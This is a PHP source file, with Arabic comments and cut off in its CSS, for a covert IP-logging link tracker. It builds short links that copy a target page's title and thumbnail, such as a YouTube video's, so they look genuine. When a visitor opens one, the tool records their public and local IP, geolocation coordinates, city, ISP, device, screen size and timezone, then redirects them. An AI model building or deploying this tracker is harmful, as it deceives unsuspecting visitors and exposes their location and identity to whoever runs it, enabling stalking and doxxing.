<?php
// ضبط المنطقة الزمنية للجزائر بدقة
date_default_timezone_set('Africa/Algiers');

// إظهار الأخطاء للتشخيص
ini_set('display_errors', 1);
error_reporting(E_ALL);

try {
    $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        meta_title TEXT,
        meta_image TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        public_ip TEXT, 
        local_ip TEXT, 
        port TEXT, 
        country TEXT, 
        city TEXT, 
        lat TEXT, 
        lon TEXT, 
        isp TEXT, 
        device_info TEXT, 
        screen_res TEXT, 
        timezone TEXT, 
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (Exception $e) {
    die("خطأ في قاعدة البيانات: " . $e->getMessage());
}

// دالة سحب العنوان والصورة الأصلية ديناميكياً من أي موقع
function fetch_real_meta($url) {$title = "";
    $image = "";

    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url,$matches)) {
        $video_id =$matches[1];
        $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
        
        $oembed_url = "https://www.youtube.com/oembed?url=" . urlencode($url) . "&format=json";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,$oembed_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        $json = curl_exec($ch);
        curl_close($ch);
        
        if ($json) {
            $data = json_decode($json, true);
            if (isset($data['title'])) {
                $title =$data['title'];
            }
        }
    }

    if (empty($title)) {$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,$url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
        $html = curl_exec($ch);
        curl_close($ch);

        if ($html) {$dom = new DOMDocument();
            @$dom->loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8'));
            $xpath = new DOMXPath($dom);

            $titleNodes =$xpath->query('//meta[@property="og:title"]/@content | //meta[@name="twitter:title"]/@content');
            if ($titleNodes->length > 0) {
                $title =$titleNodes->item(0)->nodeValue;
            } else {
                $nodes =$dom->getElementsByTagName('title');
                if ($nodes->length > 0) {
                    $title =$nodes->item(0)->nodeValue;
                }
            }

            if (empty($image)) {
                $imageNodes =$xpath->query('//meta[@property="og:image"]/@content | //meta[@name="twitter:image"]/@content');
                if ($imageNodes->length > 0) {
                    $image =$imageNodes->item(0)->nodeValue;
                }
            }
        }
    }

    if (empty($title)) {
        $title = parse_url($url, PHP_URL_HOST);
    }
    if (empty($image)) {$image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
    }

    return ['title' => trim($title), 'image' => trim($image)];
}

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function parse_isp($isp_name, $org_name) {$combined = $isp_name . ' ' .$org_name;
    if (stripos($combined, 'Mobilis') !== false or stripos($combined, 'ATM') !== false) return 'Mobilis';
    if (stripos($combined, 'Djezzy') !== false or stripos($combined, 'Optimum Telecom') !== false) return 'Djezzy';
    if (stripos($combined, 'Ooredoo') !== false or stripos($combined, 'Wataniya') !== false) return 'Ooredoo';
    if (stripos($combined, 'Algérie Télécom') !== false or stripos($combined, 'Algerie Telecom') !== false or stripos($combined, 'AT') !== false) return 'Algérie Télécom';
    return trim($isp_name) ?: 'Unknown';
}

function get_device_type($ua) {$brand = 'Device';
    if (stripos($ua, 'Samsung') !== false)$brand = 'Samsung';
    elseif (stripos($ua, 'iPhone') !== false)$brand = 'iPhone';
    elseif (stripos($ua, 'Huawei') !== false)$brand = 'Huawei';
    elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false)$brand = 'Xiaomi';
    elseif (stripos($ua, 'Oppo') !== false)$brand = 'Oppo';

    if (stripos($ua, 'Android') !== false) return$brand . ' - Android';
    if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return$brand . ' - iOS';
    if (stripos($ua, 'Windows') !== false) return 'PC - Windows';
    if (stripos($ua, 'Macintosh') !== false) return 'PC - Mac';
    return 'Unknown Device';
}

function get_ip_details($ip) {
    if ($ip == '127.0.0.1' or $ip == '::1' or$ip == 'Unknown' or strpos($ip, '10.') === 0 or strpos($ip, '192.168.') === 0) {
        return ['country' => 'Algeria (Local)', 'city' => 'Local Network', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'Localhost'];
    }
    $json = @file_get_contents("http://ip-api.com/json/" . $ip . "?fields=status,country,city,lat,lon,isp,org");
    $data = json_decode($json, true);
    if ($data and isset($data['status']) and$data['status'] == 'success') {
        return [
            'country' => $data['country'] ?? 'Unknown',
            'city' => $data['city'] ?? 'Unknown',
            'lat' => $data['lat'] ?? '36.7538',              'lon' =>$data['lon'] ?? '3.0588',
            'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
        ];
    }
    return ['country' => 'Unknown', 'city' => 'Unknown', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'Unknown'];
}

// 1. معالجة التوجيه
$og_title = "Secure Terminal";
$og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";

if (isset($_GET['r'])) {
    $code =$_GET['r'];
    $stmt =$db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link =$stmt->fetch(PDO::FETCH_ASSOC);

    if ($link) {
        $target =$link['target_url'];
        $og_title =$link['meta_title'];
        $og_image =$link['meta_image'];

        $public_ip = get_real_ip();$local_ip = $_GET['lip'] ?? 'N/A';$port = $_SERVER['REMOTE_PORT'] ?? 'N/A';$geo = get_ip_details($public_ip);$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';$device = get_device_type($ua);$screen = $_GET['screen'] ?? 'N/A';$tz = $_GET['tz'] ?? 'N/A';$created_at = date('Y-m-d H:i:s');

        if (isset($_GET['screen'])) {
            try {
                $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                $logStmt->execute([$code, $public_ip,$local_ip, $port,$geo['country'], $geo['city'],$geo['lat'], $geo['lon'],$geo['isp'], $device,$screen, $tz,$created_at]);
            } catch (Exception $e) {}

            header("Location: " . $target);
            exit();
        }
    } else {
        die("Link not found.");
    }
}

// 2. إنشاء رابط جديد
$generated_link = "";
$tracking_code = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
    $target_url = trim($_POST['target_url']);
    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
        $target_url = "https://" . $target_url;
    }

    $meta = fetch_real_meta($target_url);

    $code = substr(md5(uniqid(rand(), true)), 0, 7);
    $stmt =$db->prepare("INSERT INTO links (code, target_url, meta_title, meta_image) VALUES (?, ?, ?, ?)");
    $stmt->execute([$code,$target_url, $meta['title'],$meta['image']]);

    $tracking_code =$code;
    $domain = $_SERVER['HTTP_HOST'];$generated_link = "https://" . $domain . "/?r=" . $code;
}

$total_links =$db->query("SELECT COUNT(*) FROM links")->fetchColumn();
$total_visits =$db->query("SELECT COUNT(*) FROM logs")->fetchColumn();

// فصل ملفات وبحث السجلات بشكل مستقل لكل كود
$filter_code = trim($_GET['track'] ?? '');
if (!empty($filter_code)) {
    $stmt =$db->prepare("SELECT * FROM logs WHERE code = ? ORDER BY id DESC");
    $stmt->execute([$filter_code]);
    $logs =$stmt->fetchAll(PDO::FETCH_ASSOC);
} else {
    $logs =$db->query("SELECT * FROM logs ORDER BY id DESC LIMIT 50")->fetchAll(PDO::FETCH_ASSOC);
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($og_title); ?></title>
    
    <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
    <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
    <meta property="og:type" content="website">

    <style>
        :root {
            --bg-main: #0b0f17;
            --bg-card: #131b2e;
            --border-color: #1e293b;
            --text-main: #e2e8f0;
            --text-muted: #64748b;
            --accent: #3b82f6;
            --accent-hover: #2563eb;
            --success: #10b981;
            --danger: #ef4444;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: var(--bg-main); color: var(--text-main); padding: 30px 15px; line-height: 1.6; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
        .wrapper { max-width: 1200px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
        
        header { display: flex; justify-content: space-between; align-items: center; background: var(--bg-card); border: 1px solid var(--border-color); padding: 20px 25px; border-radius: 10px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); }
        header h1 { font-size: 16px; font-weight: 600; color: #f8fafc; letter-spacing: 0.5px; }
        .metrics { display: flex; gap: 15px; }
        .metric-card { background: #0f172a; border: 1px solid var(--border-color); padding: 8px 16px; border-radius: 6px; text-align: center; }
        .metric-card span { display: block; font-size: 10px; color: var(--text-muted); text-transform: uppercase; }
        .metric-card strong { font-size: 15px; color: #38bdf8; }

        .section-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 10px; padding: 25px; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.2); }
        h2 { font-size: 14px; font-weight: 600; margin-bottom: 16px; color: #f8fafc; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; letter-spacing: 0.5px; }

        .form-row { display: flex; gap: 10px; position: relative; }
        input[type="text"] { flex: 1; background: #0f172a; border: 1px solid var(--border-color); border-radius: 6px; padding: 12px 14px; color: #f8fafc; font-size: 14px; outline: none; transition: border 0.2s; }
        input[type="text"]:focus { border-color: var(--accent); box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2); }
        
        .btn { background: var(--accent); color: white; border: none; padding: 0 20px; border-radius: 6px; font-weight: 600; cursor: pointer; transition: background 0.2s; text-decoration: none; display: inline-flex; align-items: center; justify-content: center; font-size: 13px; white-space:
